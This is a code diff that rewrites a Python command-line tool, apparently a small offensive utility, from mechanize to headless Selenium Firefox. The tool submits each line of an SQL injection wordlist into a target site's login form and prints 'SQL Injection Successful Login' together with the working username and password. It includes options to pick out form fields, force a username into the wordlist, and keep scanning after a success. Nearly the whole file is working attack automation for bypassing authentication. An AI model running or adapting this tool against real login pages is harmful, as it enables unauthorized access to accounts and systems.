@@ -1,14 +1,24 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.firefox.service import Service
+from selenium.webdriver.firefox.options import Options
+from selenium.webdriver.common.keys import Keys
+from selenium.common.exceptions import (
+    WebDriverException,
+    NoSuchElementException,
+    TimeoutException,
+    ElementClickInterceptedException,
+    ElementNotInteractableException,
+    StaleElementReferenceException,
+    SessionNotCreatedException,
+    InvalidArgumentException,
+    JavascriptException,
+)
 
-import urllib.response
+import argparse
 import time
 import sys
-import argparse
-import mechanize
-import ssl
-import urllib
-import os
-
 
 W='\033[0m'     
 R='\033[31m'    
@@ -19,299 +29,258 @@ P= '\033[35m'
 Y="\033[1;33m"   
 
 
-class MY_SQL_IN:
-     def __init__(self):
-         self.banner =B+'''
+class SQLInjector:
+
+    def __init__(self):
+
+        self.banner =B+'''
              |________|___________________|_   
              |        |      SQLPOST_     | |    UserName
              |'''+O+''' POST '''+R+'''  | | | | | | | | | | | |%%============='''+O+'''-'''+R+'''
              |________|_'''+B+'''__________________|_|    Password         
              |        |   '''+Y+P+'''@'''+Y+'''jacstory  '''+B+'''     | '''+W    
-         print(self.banner)                                 
-         self.control()            
-         self.read_command()
-     def read_command(self):
-         try:  
-             ssl._create_default_https_context = ssl._create_unverified_context
-             if self.args.Code:
-                list_command  = open(self.args.Code,'r')   
-                list_command  = list_command .readlines()       
-             else:
-                 list_command  = open("sql",'r')   
-                 list_command  = list_command .readlines()   
+        print(self.banner+'\n')   
 
-             for command in list_command :  
-                 if self.args.userforce:
-                    if "admin" in command:
-                        command = str(command.replace('admin',self.args.userforce).replace('\n','').strip())
-                    else:
-                        command  = str(command.strip())    
-
-                 else:
-                    command  = str(command.strip())   
-                 url = self.args.URL
-                 request = mechanize.Browser()
-                 request.set_handle_robots(False)
-                 request.set_handle_redirect(True)
-                 request.set_handle_refresh(True, max_time=1)
-                 request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-                 request.set_ca_data(context=ssl._create_unverified_context(cert_reqs=ssl.CERT_NONE))
-                 Get_Oregnal_URL = request.open(url).read()        
-                 def Command_Exe() :                      
-                     if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
-                     and not self.args.UserInput and not self.args.PassInput:
-                       request["username"] = f'{command}'
-                       request["password"] = 'password'  
-                     elif not self.args.UserForm and  self.args.user and not self.args.PassForm and not self.args.password\
-                     and not self.args.UserInput and not self.args.PassInput:                  
-                       request[f'username'] = f'{self.args.user}'
-                       request["password"] = f'{command}'
-                     elif not self.args.UserForm and not self.args.user and  not self.args.PassForm and  self.args.password\
-                     and not self.args.UserInput and not self.args.PassInput : 
-                       request['username']=f'{command}'
-                       request["password"] =f'{self.args.password}'                          
-                     elif  self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
-                     and not self.args.UserInput and not self.args.PassInput :                        
-                       request[f'{self.args.UserForm}'] = f'{command}'  
-                       request[f'{self.args.PassForm}'] = 'password'    
-                     elif self.args.UserForm and self.args.PassForm and  self.args.user and not self.args.password\
-                     and not self.args.UserInput and not self.args.PassInput :   
-                       request[f'{self.args.UserForm}'] = f'{self.args.user}'  
-                       request[f'{self.args.PassForm}'] = f'{command}'                 
-                     elif self.args.UserForm and self.args.PassForm and  self.args.password  and not self.args.user\
-                     and not self.args.UserInput and not self.args.PassInput: 
-                       request[f'{self.args.UserForm}']=f'{command}'
-                       request[f'{self.args.PassForm}']=f'{self.args.password}'   
-                     elif self.args.UserForm and self.args.user and not self.args.PassForm and not self.args.password\
-                     and not self.args.UserInput and not self.args.PassInput :                 
-                       request[f'{self.args.UserForm}'] = f'{self.args.user}'
-                       request["password"] =  f'{command}' 
-                     elif not self.args.UserForm and self.args.user and self.args.PassForm and not self.args.password\
-                     and not self.args.UserInput and not self.args.PassInput:
-                        request["username"] = f'{self.args.user}'
-                        request[f'{self.args.PassForm}'] = f'{command}'  
-                     elif not self.args.UserForm and not self.args.user and not self.args.PassForm and self.args.password\
-                     and not self.args.UserInput and not self.args.PassInput: 
-                        request["username"] = f'{command}'
-                        request["password"] = f'{self.args.password}'
-                     elif self.args.UserForm  and self.args.PassForm and self.args.user and not self.args.password\
-                     and not self.args.UserInput and not self.args.PassInput:                         
-                        request[f'{self.args.UserForm}'] =  f'{self.args.user}'
-                        request[f'{self.args.PassForm}']=f'{command}'   
-                     elif self.args.UserForm and self.args.PassForm and not  self.args.user and  self.args.password\
-                     and not self.args.UserInput and not self.args.PassInput:
-                       request[f'{self.args.UserForm}'] =  f'{command}'
-                       request[f'{self.args.PassForm}']=f'{self.args.password}'                       
-                     elif not self.args.UserForm and self.args.PassForm and not self.args.user and self.args.password\
-                     and not self.args.UserInput and not self.args.PassInput:
-                       request['username'] =  f'{command}' 
-                       request[f'{self.args.PassForm}'] = f'{self.args.password}'                 
-                     elif  self.args.UserForm and  not self.args.PassForm and self.args.password  and not self.args.user\
-                     and not self.args.UserInput and not self.args.PassInput:
-                       request[f'{self.args.UserForm}']=f'{command}'
-                       request['password']=f'{self.args.password}'      
-                     elif  not self.args.UserForm and  not self.args.PassForm and not  self.args.password  and not self.args.user\
-                     and self.args.UserInput and self.args.PassInput :
-                       request['username']=f'{command}'
-                       request['password']=f'{command}'    
-                     elif   self.args.UserForm and  self.args.PassForm and not  self.args.password  and not self.args.user\
-                     and self.args.UserInput and self.args.PassInput : 
-                          request[f'{self.args.UserForm}'] =  f'{command}'
-                          request[f'{self.args.PassForm}']=f'{command}'  
-                     elif self.args.UserForm and self.args.PassForm and   self.args.password  and   self.args.user :
-                         request['username']=f'{self.args.user}'
-                         request[f'{self.args.PassForm}']=f'{self.args.password}'                         
-                         response   = request.submit()
-                         content    = response.read()
-                         passlogin  = response.geturl() 
-                         Get_URL_Content = request.open(passlogin).read()                        
-                         if  Get_URL_Content == Get_Oregnal_URL and not self.args.Error or\
-                         self.args.Error and  self.args.Error in str(content):
-                               print(B+'[*] '+R+'Login Page  URL   :'+B,url+W )                    
-                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
-                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
-                               print(B+'[*] '+R+'Status            : '+Y+'NOT LOGIN'+W)
-                               exit()
-                         else:
-                               print(B+'[*] '+R+'Login Page  URL   :'+B,passlogin +W )                    
-                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
-                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
-                               print(B+'[*] '+R+'Status            : '+Y+'LOGIN'+W)
-                               exit()         
-                     elif not self.args.UserForm and not self.args.PassForm and self.args.password  and  self.args.user : 
-                         request['username']=f'{self.args.user}'
-                         request['password']=f'{self.args.password}'    
-                         response   = request.submit()
-                         content    = response.read()
-                         passlogin  = response.geturl() 
-                         Get_URL_Content = request.open(passlogin).read()                        
-                         if  Get_URL_Content == Get_Oregnal_URL and not self.args.Error or\
-                         self.args.Error and  self.args.Error in str(content):
-                               print(B+'[*] '+R+'Login Page  URL   :'+B,url+W )                    
-                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
-                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
-                               print(B+'[*] '+R+'Status            : '+Y+'NOT LOGIN'+W)
-                               exit()
-                         else:
-                               print(B+'[*] '+R+'Login Page  URL   :'+B,passlogin +W )                    
-                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
-                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
-                               print(B+'[*] '+R+'Status            : '+Y+'LOGIN'+W)
-                               exit()      
-                     else:
-                       print(B+'[!] '+R+'Command Not Found'+W)
-                       print(B+'[!] '+R+'Plases see the help options to how to use '+W)
-                       exit()       
-                 try:   
-                        
-                    request.select_form(nr = 0)
-                    Command_Exe()
-                 except Exception :
-                      try:
-                         request.select_form(nr = 1) 
-                         Command_Exe()
-                      except Exception :   
-                           try:
-                              request.select_form(nr = 2)
-                              Command_Exe()
-                           except Exception : 
-                                try:
-                                  request.select_form(nr = 3)
-                                  Command_Exe()
-                                except Exception :   
-                                    try:
-                                      request.select_form(nr = 4)
-                                      Command_Exe()
-                                    except Exception as D :   
-                                        print(B+"[!] "+R+"Error :",str(D)+W)
-                                        exit()                                                          
-                 response   = request.submit()
-                 content    = response.read()
-                 passlogin  = response.geturl() 
-                 Get_URL_Content = request.open(passlogin).read()    
-                 if self.args.Error and self.args.Error in str(content):
-                     print(B+'\n[*]'+R+' SLQ Injaction Command    : '+P, command +W)
-                     print(B+'[*]'+R+' Login Page  URL          : '+B, url+W )                    
-                     print(B+'[*]'+R+' Status                   : '+Y+' NOT LOGIN'+W) 
-                     sys.stdout.write('\x1b[1A')
-                     sys.stdout.write('\x1b[2K')  
-                     sys.stdout.write('\x1b[1A')
-                     sys.stdout.write('\x1b[2K') 
-                     sys.stdout.write('\x1b[1A')
-                     sys.stdout.write('\x1b[2K') 
-                     sys.stdout.write('\x1b[1A')
-                     sys.stdout.write('\x1b[2K')
-                 elif Get_URL_Content == Get_Oregnal_URL  :
-                     
-                     print(B+'\n[*]'+R+' SLQ Injaction Command    : '+P, command +W)
-                     print(B+'[*]'+R+' Login Page  URL          : '+B, url+W )                    
-                     print(B+'[*]'+R+' Status                   : '+Y+' NOT LOGIN'+W) 
-                     sys.stdout.write('\x1b[1A')
-                     sys.stdout.write('\x1b[2K')  
-                     sys.stdout.write('\x1b[1A')
-                     sys.stdout.write('\x1b[2K') 
-                     sys.stdout.write('\x1b[1A')
-                     sys.stdout.write('\x1b[2K') 
-                     sys.stdout.write('\x1b[1A')
-                     sys.stdout.write('\x1b[2K')
-                    
-                 else: 
-                      print(B+'[*] '+'Login URL  : '+R,  passlogin)
-                      print(B+'[*] '+'SLQ Injaction Successful  Login ')
-                      print(O+'='*30+'\n'+B+'[!] '+R+'Credentials  : - '+O+'\n'+'='* 20+'\n'+W)
-                      if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
-                      and not self.args.UserInput and not self.args.PassInput:
-                           print(B+'[+] '+R+'username : '+Y+f'{command}')
-                           print(B+'[+] '+R+'Password : '+Y+ 'password')                          
-                      elif not self.args.UserForm and  self.args.user and not self.args.PassForm and not self.args.password\
-                      and not self.args.UserInput and not self.args.PassInput: 
-                           print(B+'[+] '+R+'username : '+Y+f'{self.args.user}')
-                           print(B+'[+] '+R+'Password : '+Y+ f'{command}')                           
-                      elif not self.args.UserForm and not self.args.user and  not self.args.PassForm and  self.args.password\
-                      and not self.args.UserInput and not self.args.PassInput :   
-                           print(B+'[+] '+R+'username : '+Y+ f'{command}')   
-                           print(B+'[+] '+R+'Password : '+Y+ f'{self.args.password}')      
-                      elif  self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
-                      and not self.args.UserInput and not self.args.PassInput :    
-                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{command}')
-                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+'password') 
-                      elif self.args.UserForm and self.args.PassForm and  self.args.user and not self.args.password\
-                      and not self.args.UserInput and not self.args.PassInput :
-                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{self.args.user}')
-                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}') 
-                      elif self.args.UserForm and self.args.PassForm and  self.args.password  and not self.args.user\
-                      and not self.args.UserInput and not self.args.PassInput:
-                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{command}')
-                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{self.args.password}')  
-                      elif self.args.UserForm and self.args.user and not self.args.PassForm and not self.args.password\
-                      and not self.args.UserInput and not self.args.PassInput :   
-                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{self.args.user}')
-                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}')   
-                      elif not self.args.UserForm and self.args.user and self.args.PassForm and not self.args.password\
-                      and not self.args.UserInput and not self.args.PassInput:   
-                           print(B+'[+] '+R+'username : '+Y+f'{self.args.user}')
-                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}') 
-                      elif not self.args.UserForm and not self.args.user and not self.args.PassForm and self.args.password\
-                      and not self.args.UserInput and not self.args.PassInput:    
-                           print(B+'[+] '+R+'username : '+Y+f'{command}')
-                           print(B+'[+] '+R+'password : '+Y+f'{self.args.password}')
-                      elif self.args.UserForm  and self.args.PassForm and self.args.user and not self.args.password\
-                      and not self.args.UserInput and not self.args.PassInput:                  
-                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+']  :'+Y+f'{self.args.user}')
-                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}')
-                      elif self.args.UserForm and self.args.PassForm and not  self.args.user and  self.args.password\
-                      and not self.args.UserInput and not self.args.PassInput:  
-                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+']  :'+Y+f'{command}')
-                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{self.args.password}')
-                      elif not self.args.UserForm and self.args.PassForm and not self.args.user and self.args.password\
-                      and not self.args.UserInput and not self.args.PassInput:     
-                           print(B+'[+] '+R+'username : '+Y+f'{command}')
-                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{self.args.password}')
-                      elif  self.args.UserForm and  not self.args.PassForm and self.args.password  and not self.args.user\
-                      and not self.args.UserInput and not self.args.PassInput:  
-                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+']  :'+Y+f'{command}')
-                           print(B+'[+] '+R+'password : '+Y+f'{self.args.password}')
-                      elif  not self.args.UserForm and  not self.args.PassForm and not  self.args.password  and not self.args.user\
-                      and self.args.UserInput and self.args.PassInput :      
-                           print(B+'[+] '+R+'username : '+Y+f'{command}')
-                           print(B+'[+] '+R+'password : '+Y+f'{command}')
-                      elif   self.args.UserForm and  self.args.PassForm and not  self.args.password  and not self.args.user\
-                      and self.args.UserInput and self.args.PassInput :      
-                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{command}')    
-                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}')
-                      exit()
-                         
-             print(B+'[!] '+R+'Web May Not Vulnerable To SQL Injaction '+W)
-             print(B+'[*] '+R+'Saugger To Use anther list Command '+W)  
-         except urllib.error.URLError:
-                 print(B+"[*] "+R+"Bad URL Connection refused"+W)
-                 exit()
-         except Exception as a :
-                print( B+"[#] "+R+"Error : "+Y+str(a)+W )
-         except KeyboardInterrupt:
-              exit()
-       
-     def control(self):
-        
-        print(B+"")
-        parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
-        parser.add_argument('--URL'        , action=None                   ,help ="target url loign page") 
-        parser.add_argument("-c  ","--Code"       , action=None  ,help ="the List of SQL Commands") 
-        parser.add_argument("-fu","--UserForm"   , action=None                   ,help =" add name of the HTML Form Login User")
-        parser.add_argument("-FP","--PassForm"   , action=None                   ,help ="add name of the HTML Form Login Passord")
-        parser.add_argument("-E","--Error"      , action=None                   ,help =" add Error login message to compare it with HTML response ")
-        parser.add_argument("-pI","--PassInput"  , action='store_true'           ,help ="use to POST in Password field")
-        parser.add_argument("-uI","--UserInput"  , action='store_true'           ,help ="use to POST in user field")
-        parser.add_argument("-N","--user"       , action=None                   ,help ="use specific username ")
-        parser.add_argument("-P","--password"   , action=None                   ,help ="use specific Passowrd")     
-        parser.add_argument("-U", "--userforce", action=None, help="Specify a specific username from a wordlist to brute force")
+        self.setup_args()
+        if self.args.man:
+            from Package.man import ManPage
+            ManPage()
+            exit()
+        self.setup_browser()
+        self.test_sql_injection()
     
-        self.args = parser.parse_args()  
+    def setup_browser(self):
+        options = Options()
+        if not self.args.live:
+            try: 
+                options.add_argument('--headless')
+                options.add_argument('--disable-gpu')
+                options.add_argument('--no-sandbox')
+                options.add_argument('--disable-dev-shm-usage')
+                service = Service('./Package/geckodriver')
+                self.driver = webdriver.Firefox(service=service, options=options)  
+                self.driver.set_page_load_timeout(10)
+            except Exception as e:
+                print(R+"[+] Error      -------------|- "+W+Y+ f"An error of type {type(e).__name__}"+W)  
+                exit() 
+            except KeyboardInterrupt:
+                  exit()       
+        elif self.args.live : 
+            try  :
+                service = Service('./geckodriver')
+                self.driver = webdriver.Firefox(service=service, options=options)  
+                self.driver.set_page_load_timeout(10)
+                self.driver.set_window_size(800, 600)  # Adjust size
+                self.driver.set_window_position(self.driver.execute_script("return window.screen.availWidth;") - 800, 44)  
+            except Exception as e:
+                print(R+"[+] Error      -------------|- "+W+Y+ f"An error of type {type(e).__name__}"+W)  
+                exit()   
+            except KeyboardInterrupt:
+                  exit()       
+        try:        
+            self.driver.get(self.args.url)
+            self.page_len = len(self.driver.page_source)
+            self.driver.set_page_load_timeout(10)
+        except Exception as e:
+            print(R+"[+] Error     -------------|- "+W+Y+ f"An error of type {type(e).__name__}"+W)  
+            exit()
+        except KeyboardInterrupt:
+                  exit()        
+    def test_sql_injection(self):
+        if self.args.wordlist:
+            list_command  = open(self.args.wordlist,'r')   
+            list_command  = list_command.readlines()       
+        else:
+            list_command  = open("./Package/sql",'r')
+            list_command  = list_command.readlines() 
+        self.Info_Print()
+        if self.args.Continue:
+            print(R+" "+"-"*150) 
+            print("|  "+f"{'   username    ':<23}","| "+f"{'     password   ':<24}"+"| ",f"{'   Status  ':<11}","|",f"{'   login url ':<80}","|")
+            print(" "+"-"*150+W)    
+        for command in list_command :  
+            if self.args.userforce:
+                if "admin" in command:
+                    command = str(command.replace('admin',self.args.userforce).replace('\n','').strip())
+                else:
+                    command  = str(command.strip())    
+            else:
+                command  = str(command.strip()) 
+            try:
+                self.driver.get(self.args.url)
+                if self.args.user_form and self.args.pass_form:
+                    user_field = self.driver.find_element(By.NAME, self.args.user_form)
+                    pass_field = self.driver.find_element(By.NAME, self.args.pass_form)
+                elif self.args.UCSS and self.args.PCSS :
+                    user_field = self.driver.find_element(By.CSS_SELECTOR, self.args.UCSS)
+                    pass_field = self.driver.find_element(By.CSS_SELECTOR, self.args.PCSS)
+                elif self.args.UXpath and self.args.PXpath:
+                   user_field = self.driver.find_element(By.XPATH, self.args.UXpath)
+                   pass_field = self.driver.find_element(By.XPATH, self.args.PXpath)    
+                elif self.args.IDUSER and self.args.IDPASS:
+                    user_field = self.driver.find_element(By.ID, self.args.ID)
+                    pass_field = self.driver.find_element(By.ID, self.args.ID)
+                user_field.clear()
+                pass_field.clear()
+                if self.args.username:
+                    if self.args.time:
+                        time.sleep(int(self.args.time))
+                    user_field.send_keys(self.args.username)
+                    pass_field.send_keys(command) 
+                elif self.args.password:
+                    if self.args.time:
+                        time.sleep(int(self.args.time))
+                    user_field.send_keys(command)
+                    pass_field.send_keys(self.args.password)   
+                elif not self.args.username and not self.args.password: 
+                    if self.args.time:
+                        time.sleep(int(self.args.time))
+                    user_field.send_keys(command)
+                    pass_field.send_keys('password')      
+                pass_field.send_keys(Keys.RETURN)
+                time.sleep(.30)
+                page_source = self.driver.page_source
+                if self.args.error and self.args.error in str(page_source) or ("Error"or "error") in page_source :
+                    print(B+'\n[*]'+R+' SLQ Injaction Command    : '+P, command +W)
+                    print(B+'[*]'+R+' Login Page  URL          : '+B, self.args.url+W )     
+                    if self.args.error:
+                        print(B+'[*]'+R+' Status                   : '+Y+self.args.error+W)
+                    else:               
+                        print(B+'[*]'+R+' Status                   : '+Y+' NOT LOGIN'+W) 
+                    for _ in range(4):
+                        sys.stdout.write('\x1b[1A')
+                        sys.stdout.write('\x1b[2K')  
+                      
+                else:
+                    if self.args.Continue:
+                        if self.args.username:
+                            print(R+"|  "+Y+f"{self.args.username:<23}",R+"|"+P+f"{     command   :<23}"+R+" | "+B+f"{' login ':<12}",R+"|",f'{str(self.driver.current_url):<80}',"|")
+                        elif self.args.password:
+                            print(R+"|  "+Y+f"{command:<23}",R+"| "+P+f"{     self.args.password   :<23}"+R+" | "+B+f"{' login ':<12}",R+"|",f'{str(self.driver.current_url):<80}',"|")  
+                        elif not  self.args.username and not self.args.password:  
+                            print(R+"|  "+Y+f"{command:<23}",R+"| "+P+f"{'   password    ':<23}"+R+" | "+B+f"{' login ':<12}",R+"|",f'{str(self.driver.current_url):<80}',"|")
+                    elif not self.args.Continue  : 
+                        print(O+'='*30+'\n')     
+                        print(B+'[*] '+'Login URL  : '+R,  str(self.driver.current_url))
+                        print(B+'[*] '+'SLQ Injaction Successful  Login \n')
+                        print(O+'='*30+'\n\n'+B+'[!] '+R+'Credentials  : - '+O+'\n'+'='* 20+'\n\n'+W)
+                        if self.args.username:
+                            print(B+'[+] '+R+'username : '+Y+f'{self.args.username}')
+                            print(B+'[+] '+R+'Password : '+Y+f'{command}')
+                        elif self.args.password:
+                            print(B+'[+] '+R+'username : '+Y+f'{command}')
+                            print(B+'[+] '+R+'Password : '+Y+ f'{self.args.password}')
+                        elif not  self.args.username and not self.args.password:
+                            print(B+'[+] '+R+'username : '+Y+f'{command}')
+                            print(B+'[+] '+R+'Password : '+Y+ 'password') 
+
+                        exit()
+            except Exception :
+                exit()
+            except KeyboardInterrupt:
+                  exit()  
+        if self.args.Continue:
+            print(O+'='*30+'\n')     
+            print(B+'[*] '+'Login URL  : '+R,  str(self.driver.current_url))
+            print(B+'[*] '+'SLQ Injaction Successful  Login \n')
+            print(O+'='*30+'\n\n'+B+'[!] '+R+'Credentials  : - '+O+'\n'+'='* 20+'\n\n'+W)
+            if self.args.username:
+                print(B+'[+] '+R+'username : '+Y+f'{self.args.username}')
+                print(B+'[+] '+R+'Password : '+Y+f'{command}')
+            elif self.args.password:
+                print(B+'[+] '+R+'username : '+Y+f'{command}')
+                print(B+'[+] '+R+'Password : '+Y+ f'{self.args.password}')
+            elif not  self.args.username and not self.args.password:
+                print(B+'[+] '+R+'username : '+Y+f'{command}')
+                print(B+'[+] '+R+'Password : '+Y+ 'password') 
+         
+        print(B+'[!] '+R+'Web May Not Vulnerable To SQL Injaction '+W)
+        print(B+'[*] '+R+'Saugger To Use anther list Command '+W) 
+        self.driver.quit()
+    def Info_Print(self):
+        print(B+"[+] Target url         --------------|- " +  str(self.args.url))
+        time.sleep(0.20)
+        if self.args.wordlist:
+            print("[+] wordlist           -------------|- " +  str(self.args.wordlist))
+            time.sleep(0.20)
+        else:
+            print("[+] wordlist           --------------|- " +  "sql")  
+            time.sleep(0.20) 
+        if self.args.user_form  :
+            print("[+] UserForm             --------------|- " +  self.args.user_form)
+            time.sleep(0.20) 
+        if self.args.pass_form  :
+            print("[+] PassForm             --------------|- " +  self.args.pass_form )  
+            time.sleep(0.20)   
+        if self.args.UCSS:
+              print("[+] CSS_SELECTOR USER  --------------|- " +  self.args.UCSS)
+              time.sleep(0.20) 
+        if self.args.PCSS:
+              print("[+] CSS_SELECTOR PASS  --------------|- " +  self.args.PCSS )
+              time.sleep(0.20) 
+        if self.args.UXpath:
+              print("[+] XPATH USER         --------------|- " +  self.args.UXpath)
+              time.sleep(0.20) 
+        if self.args.PXpath:
+              print("[+] XPATH PASS         --------------|- " +  self.args.PXpath)
+              time.sleep(0.20) 
+        if self.args.IDUSER:
+              print("[+] IDUSERFORM         --------------|- " +  self.args.IDUSER)
+              time.sleep(0.20) 
+        if self.args.IDPASS:
+              print("[+] IDPASSFORM         --------------|- " +  self.args.IDPASS)  
+              time.sleep(0.20)     
+        if self.args.password:
+              print("[+] Password           --------------|- " +  self.args.password)
+              time.sleep(0.20) 
+        if self.args.username:
+              print("[+] UserName           --------------|- " +  self.args.username)
+              time.sleep(0.20) 
+        if self.args.userforce:
+              print("[+] User wordlist      --------------|- " +  self.args.userforce)
+              time.sleep(0.20) 
+        if self.args.Continue : 
+              print("[+] Continue           --------------|- " +  "TRUE")
+              time.sleep(0.20) 
+        if self.args.Length  :
+              print("[+] Page Length        --------------|- " +  str(self.args.Length)+W+'\n')      
+              time.sleep(0.20) 
+        if self.args.error:
+              print("[+] Error Message      --------------|- " +  self.args.error )
+              time.sleep(0.20)  
+        if self.args.time:
+              print("[+] Sleep duration     --------------|- " +  self.args.time )
+              time.sleep(0.20)                 
+        print()
+    def setup_args(self):
+        parser = argparse.ArgumentParser(description="SQL Injection Tester with Selenium")
+        parser.add_argument('-U', '--url'         ,  help="Target URL of the login page")
+        parser.add_argument('--man'               ,  action='store_true', help="show this man page")
+        parser.add_argument('-uf', '--user_form'  ,  help="Name of the username input field")
+        parser.add_argument('-pf', '--pass_form'  ,  help="Name of the password input field")
+        parser.add_argument('-w', '--wordlist'    ,  help="File containing the list of SQL commands to test")
+        parser.add_argument('-e', '--error'       ,  help="Error message to identify unsuccessful login attempts")
+        parser.add_argument('-uc', '--UCSS'       ,  help="CSS selector for the username input field")
+        parser.add_argument('-pc', '--PCSS'       ,  help="CSS selector for the password input field")
+        parser.add_argument('-ux', '--UXpath'     ,  help="XPath for the username input field")
+        parser.add_argument('-px', '--PXpath'     ,  help="XPath for the password input field")
+        parser.add_argument('-ui', '--IDUSER'     ,  help="ID for the username input field")
+        parser.add_argument('-pi', '--IDPASS'     ,  help="ID for the password input field")
+        parser.add_argument('-p', '--password'    ,  help="Specific password to test")
+        parser.add_argument('-u', '--username'    ,  help="Specific username to test")
+        parser.add_argument('-f', '--userforce'   ,  help="Force a specific username into the wordlist")
+        parser.add_argument('-C', '--Continue'    ,  action='store_true', help="Continue scanning through the entire wordlist")
+        parser.add_argument('-L', '--Length'      ,  help="Set the expected page length to compare with the original page")
+        parser.add_argument('-l', '--live'        ,  action='store_true', help="Show the web browser window (disable headless mode)")
+        parser.add_argument('-T', '--time'        ,  help="Sleep duration between requests")
+
+        self.args = parser.parse_args()   
         print(W+"")
         if len(sys.argv)!=1 :
             pass
         else:
             parser.print_help()        
             exit() 
-if __name__=='__main__':
-   MY_SQL_IN()    
+
+if __name__ == '__main__':
+    injector = SQLInjector()
